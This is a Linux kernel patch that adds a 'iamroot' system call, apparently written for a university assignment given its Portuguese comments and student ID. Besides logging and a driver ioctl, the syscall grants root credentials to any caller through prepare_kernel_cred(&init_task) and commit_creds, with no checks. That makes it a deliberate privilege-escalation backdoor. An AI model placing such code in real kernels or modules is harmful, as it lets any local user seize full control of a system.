@@ -1,0 +1,97 @@
+diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
+index 1d6eee30e..1dacea989 100644
+--- a/arch/x86/entry/syscalls/syscall_64.tbl
++++ b/arch/x86/entry/syscalls/syscall_64.tbl
+@@ -375,6 +375,7 @@
+ 451	common	cachestat		sys_cachestat
+ 452	common	fchmodat2		sys_fchmodat2
+ 453	64	map_shadow_stack	sys_map_shadow_stack
++692	common	iamroot			sys_iamroot
+ 
+ #
+ # Due to a historical design error, certain syscalls are numbered differently
+diff --git a/include/linux/syscalls.h b/include/linux/syscalls.h
+index 22bc6bc14..b39ca20a2 100644
+--- a/include/linux/syscalls.h
++++ b/include/linux/syscalls.h
+@@ -645,6 +645,7 @@ asmlinkage long sys_rt_sigtimedwait_time32(const sigset_t __user *uthese,
+ asmlinkage long sys_rt_sigqueueinfo(pid_t pid, int sig, siginfo_t __user *uinfo);
+ asmlinkage long sys_setpriority(int which, int who, int niceval);
+ asmlinkage long sys_getpriority(int which, int who);
++asmlinkage long sys_iamroot(int flag);
+ asmlinkage long sys_reboot(int magic1, int magic2, unsigned int cmd,
+ 				void __user *arg);
+ asmlinkage long sys_setregid(gid_t rgid, gid_t egid);
+diff --git a/kernel/sys.c b/kernel/sys.c
+index 7a4ae6d5a..183466684 100644
+--- a/kernel/sys.c
++++ b/kernel/sys.c
+@@ -64,6 +64,8 @@
+ #include <linux/rcupdate.h>
+ #include <linux/uidgid.h>
+ #include <linux/cred.h>
++#include <linux/timekeeping.h>
++#include <linux/time.h>
+ 
+ #include <linux/nospec.h>
+ 
+@@ -215,6 +217,59 @@ static int set_one_prio(struct task_struct *p, int niceval, int error)
+ 	return error;
+ }
+ 
++/* ===== T03 - Chamada de sistema iamroot ===== */
++#define IAMROOT_MATRICULA	2311292
++#define IAMROOT_DRIVER_PATH	"/proc/IDP-cdriver"
++
++DEFINE_PER_CPU(bool, syscall_iamroot_flag);
++EXPORT_PER_CPU_SYMBOL(syscall_iamroot_flag);
++
++SYSCALL_DEFINE1(iamroot, int, flag)
++{
++	struct file *driver;
++	struct timespec64 ts;
++	struct tm tm;
++	struct cred *new_cred;
++	long ret = 0;
++
++	/* 1. Matricula */
++	pr_info("iamroot: matricula = %d\n", IAMROOT_MATRICULA);
++
++	/* 2. Hora do sistema (HH:MM:SS, fuso de Brasilia UTC-3) */
++	ktime_get_real_ts64(&ts);
++	time64_to_tm(ts.tv_sec, -3 * 3600, &tm);
++	pr_info("iamroot: hora = %02d:%02d:%02d\n",
++		tm.tm_hour, tm.tm_min, tm.tm_sec);
++
++	/* 3a. Marca a flag per-CPU como verdadeira (lida pelo driver) */
++	this_cpu_write(syscall_iamroot_flag, true);
++
++	/* 3b. Interage com o driver-atividade.ko via ioctl */
++	driver = filp_open(IAMROOT_DRIVER_PATH, O_RDWR, 0);
++	if (IS_ERR(driver)) {
++		pr_err("iamroot: falha ao abrir %s (%ld)\n",
++		       IAMROOT_DRIVER_PATH, PTR_ERR(driver));
++	} else {
++		if (driver->f_op && driver->f_op->unlocked_ioctl)
++			driver->f_op->unlocked_ioctl(driver, IAMROOT_MATRICULA, 0);
++		filp_close(driver, NULL);
++	}
++
++	/* 3c. Restaura a flag */
++	this_cpu_write(syscall_iamroot_flag, false);
++
++	/* 4. Eleva privilegios para root.
++	 * Em 6.6.13 prepare_kernel_cred(NULL) dispara WARN_ON e retorna NULL;
++	 * usa-se &init_task, cujas credenciais sao as do init (root). */
++	new_cred = prepare_kernel_cred(&init_task);
++	if (new_cred)
++		commit_creds(new_cred);
++	else
++		ret = -ENOMEM;
++
++	return ret;
++}
++
+ SYSCALL_DEFINE3(setpriority, int, which, int, who, int, niceval)
+ {
+ 	struct task_struct *g, *p;
